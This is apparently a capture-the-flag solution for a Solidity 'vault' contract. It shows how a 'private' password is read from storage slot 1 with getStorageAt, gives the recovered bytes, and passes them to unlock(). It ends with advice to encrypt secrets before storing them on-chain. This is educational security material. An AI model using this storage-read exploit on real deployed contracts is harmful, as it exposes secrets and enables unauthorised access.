//private variables in solidity are still visible
//they are stored on-chain just as the public ones, but can not be accessed with solidity code
//knowing the address of the contract and the slot of memory the value occupies in the memory layout makes it possible to read the value from the blockchain 

//The solution consists of the following commands:

//1. read the value of the password from the second slot of the contracts address memory space (the first slot is 'bool locked' )
await web3.eth.getStorageAt(contract.address,1)
//'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'

//2.call the unlock function passing the byte string as parameter
contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')

//the only way to make variables truly private in solidity is by encypting them before writing on blockchain
//and storing the key off-chain
